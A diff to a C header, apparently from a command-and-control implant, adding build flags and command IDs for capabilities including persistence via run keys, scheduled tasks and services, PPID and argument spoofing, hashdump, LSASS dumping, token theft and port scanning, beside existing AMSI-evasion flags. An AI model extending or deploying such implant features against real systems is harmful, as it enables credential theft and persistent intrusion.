@@ -64,6 +64,28 @@
 #define INCLUDE_CMD_POWERPICK
 #define INCLUDE_CMD_SPAWNTO_X64
 #define INCLUDE_CMD_SPAWNTO_X86
+#define INCLUDE_CMD_SPAWN
+#define INCLUDE_CMD_ARP
+#define INCLUDE_CMD_DRIVES
+#define INCLUDE_CMD_UPTIME
+#define INCLUDE_CMD_NET_SESSIONS
+#define INCLUDE_CMD_NET_SHARES
+#define INCLUDE_CMD_NET_LOGGEDON
+#define INCLUDE_CMD_CLIPBOARD
+#define INCLUDE_CMD_WINDOWS
+#define INCLUDE_CMD_REG_DELETE
+#define INCLUDE_CMD_REG_CREATE_KEY
+#define INCLUDE_CMD_PERSIST_RUN
+#define INCLUDE_CMD_PERSIST_SCHTASK
+#define INCLUDE_CMD_PERSIST_SERVICE
+#define INCLUDE_CMD_PPID_SPOOF
+#define INCLUDE_CMD_ARGUE
+#define INCLUDE_CMD_RUNAS
+#define INCLUDE_CMD_HASHDUMP
+#define INCLUDE_CMD_LSASS_DUMP
+#define INCLUDE_CMD_TOKEN_STORE
+#define INCLUDE_CMD_PORTSCAN
+#define INCLUDE_CMD_INLINE_EXECUTE
 
 #define INCLUDE_EVASION_SPOOF
 #define INCLUDE_EVASION_AMSI
@@ -166,6 +188,28 @@
 #define CMD_POWERPICK            0x3B
 #define CMD_SPAWNTO_X64           0x3C
 #define CMD_SPAWNTO_X86           0x3D
+#define CMD_SPAWN                 0x3E
+#define CMD_ARP                   0x3F
+#define CMD_DRIVES                0x40
+#define CMD_UPTIME                0x41
+#define CMD_NET_SESSIONS          0x42
+#define CMD_NET_SHARES            0x43
+#define CMD_NET_LOGGEDON          0x44
+#define CMD_CLIPBOARD             0x45
+#define CMD_WINDOWS               0x46
+#define CMD_REG_DELETE            0x47
+#define CMD_REG_CREATE_KEY        0x48
+#define CMD_PERSIST_RUN           0x49
+#define CMD_PERSIST_SCHTASK       0x4A
+#define CMD_PERSIST_SERVICE       0x4B
+#define CMD_PPID_SPOOF            0x4C
+#define CMD_ARGUE                 0x4D
+#define CMD_RUNAS                 0x4E
+#define CMD_HASHDUMP              0x4F
+#define CMD_LSASS_DUMP            0x50
+#define CMD_TOKEN_STORE           0x51
+#define CMD_PORTSCAN              0x52
+#define CMD_INLINE_EXECUTE        0x53
 
 #define RESPONSE_SUCCESS    0x00
 #define RESPONSE_ERROR      0x01
